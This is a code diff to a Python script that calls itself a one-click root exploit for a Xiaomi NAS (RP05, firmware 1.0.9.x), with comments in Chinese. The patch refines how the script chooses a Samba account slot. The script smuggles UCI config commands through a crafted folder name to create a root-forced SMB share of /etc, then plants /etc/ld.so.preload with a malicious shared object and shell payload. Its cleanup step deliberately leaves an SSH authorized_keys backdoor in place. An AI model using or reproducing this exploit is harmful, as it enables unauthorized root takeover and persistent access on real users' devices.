@@ -377,17 +377,20 @@ def _smb_write_file(share, name, data, password):
         os.rmdir(mnt)
 
 
-def _disarm_command(uid, weird_name):
+def _disarm_command(uid, weird_name, share_id):
     """清理命令（成功与失败路径共用）。覆盖：preload/payload 文件、staging 怪名目录、
-    注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。"""
+    注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。
+    share_id 必须与本次注入/set 使用的槽位一致（空账号常为 1，已有共享常为 2）。"""
+    share_id = str(share_id)
+    section = "u%s_%s" % (uid, share_id)
     return ("rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log; "
             "rm -rf '/home/u%s/pool0/data/%s'; "
-            "uci delete sambashare.u%s_1; uci commit sambashare; "
-            "uci delete sambauser.u%s_1 2>/dev/null; uci commit sambauser; "
+            "uci delete sambashare.%s; uci commit sambashare; "
+            "uci delete sambauser.%s 2>/dev/null; uci commit sambauser; "
             "sed -i '/sambau%s/d' /etc/passwd /etc/shadow 2>/dev/null; "
             "nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null; "
             "echo CLEAN_OK"
-            ) % (uid, weird_name.replace("'", "'\\''"), uid, uid, uid)
+            ) % (uid, weird_name.replace("'", "'\\''"), section, section, uid)
 
 
 def _shell_exec(ip, port, feed, timeout=60):
@@ -501,6 +504,31 @@ def preflight(cert_dir_arg=None):
     return problems
 
 
+
+def _existing_samba_account_ids(nas):
+    """读 netshare/get_samba_account，返回已占用 id 的字符串集合。
+    固件 smb_get_id 只看槽位 1：空则下次用 1，否则用 2（不检查 2 是否已占用）。"""
+    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/get_samba_account", {}))
+    accounts = ((j.get("data") or {}).get("account") or [])
+    if not isinstance(accounts, list):
+        die("get_samba_account returned unexpected payload: %s" % j)
+    ids = set()
+    for entry in accounts:
+        if not isinstance(entry, dict) or entry.get("id") is None:
+            continue
+        ids.add(str(entry.get("id")))
+    return ids
+
+
+def _plan_samba_share_id(existing_ids):
+    """按固件 smb_get_id 规则选择本次新建槽位：无 id=1 用 1，否则用 2。
+    若目标槽位已被占用则拒绝覆盖。"""
+    planned = "2" if "1" in existing_ids else "1"
+    if planned in existing_ids:
+        die("samba account slot id=%s already occupied; refusing to overwrite existing share" % planned)
+    return planned
+
+
 def main():
     ap = argparse.ArgumentParser(description="Xiaomi NAS one-click root (RP05, fw 1.0.9.x)")
     ap.add_argument("ip", nargs="?", default=None)
@@ -543,15 +571,22 @@ def main():
 
     # ---------- ② uci heredoc injection → root share ----------
     log("step", "uci 注入: 建立 force user=root 的 /etc SMB 共享")
+    # 先探测已有账号槽位，再决定注入目标：空账号→id=1，已有首个共享→id=2
+    # （对齐固件 smb_get_id：只检查 _1 是否存在；见 get_samba_account）
+    existing_ids = _existing_samba_account_ids(nas)
+    log("info", "existing samba account ids: %s" % (",".join(sorted(existing_ids)) if existing_ids else "(none)"))
+    share_id = _plan_samba_share_id(existing_ids)
+    section = "u%s_%s" % (nas.uid, share_id)
+    log("ok", "planned samba share slot id=%s / %s" % (share_id, section))
     NL = chr(10)
     Q = chr(34)
     M30 = "M" * 30
     weird_name = (
         M30 + NL + Q + NL +
-        "set sambashare.u%s_1.user_force=root" % nas.uid + NL +
-        "set sambashare.u%s_1.create_mask=0644" % nas.uid + NL +
-        "set sambashare.u%s_1.path=etc" % nas.uid + NL +
-        "set sambashare.u%s_1.comment=" % nas.uid
+        "set sambashare.%s.user_force=root" % section + NL +
+        "set sambashare.%s.create_mask=0644" % section + NL +
+        "set sambashare.%s.path=etc" % section + NL +
+        "set sambashare.%s.comment=" % section
     )
     enc = urllib.parse.quote(weird_name, safe="")
     # /pool0 为单池默认布局（get_pool_info 的 data_dir 即 /pool0/data）；多池设备需按实际调整
@@ -569,23 +604,23 @@ def main():
                                 {"username": "u" + nas.uid, "password": smb_password,
                                  "share_dir": [weird_real]}, timeout=60))
     # add 失败不区分原因直接试 set（A4：原实现把解析失败当成功再叠加误判）；
-    # 空账号首次建共享落在 id=1 / u{uid}_1（RP05 重置后实测）；已有共享的设备可能仍是 id=2
+    # id 来自上方探测，不再写死 1 或 2
     if j.get("code") not in (0, None):
         j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
-                                    {"id": "1", "username": "u" + nas.uid, "password": smb_password,
+                                    {"id": share_id, "username": "u" + nas.uid, "password": smb_password,
                                      "share_dir": [weird_real]}, timeout=90))
     code = j.get("code")
-    log("info" if code in (0, None) else "warn", "add_samba_account code=%s (2502 restart-fail 可继续)" % code)
+    log("info" if code in (0, None) else "warn", "add_samba_account code=%s id=%s (2502 restart-fail 可继续)" % (code, share_id))
     # note: restart failure is fine — the uci entries are already written; repair below
     time.sleep(5)
 
     # repair: point share to clean /etc path via set (keeps user_force=root)
     j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
-                                {"id": "1", "username": "u" + nas.uid, "password": smb_password,
+                                {"id": share_id, "username": "u" + nas.uid, "password": smb_password,
                                  "share_dir": ["/etc"]}, timeout=120))
     if j.get("code") not in (0, None) or " 20" not in j.get("http_status", ""):
-        die("share repair failed: %s" % j)
-    log("ok", "SMB /etc share active as user u%s (force user=root)" % nas.uid)
+        die("share repair failed (id=%s): %s" % (share_id, j))
+    log("ok", "SMB /etc share active as user u%s id=%s (force user=root)" % (nas.uid, share_id))
 
     # ---------- ③ preload trigger ----------
     log("step", "写入 /etc/ld.so.preload + 触发 .so (cron 每分钟生效)")
@@ -617,7 +652,7 @@ def main():
     # 因此按候选列表逐个尝试。
     share_candidates = ["\\\\%s\\%s-%s" % (args.ip, weird_name[:30], nas.uid),
                         "\\\\%s\\etc-%s" % (args.ip, nas.uid)]
-    disarm = _disarm_command(nas.uid, weird_name)
+    disarm = _disarm_command(nas.uid, weird_name, share_id)
     share = None
     last_exc = None
     for cand in share_candidates:
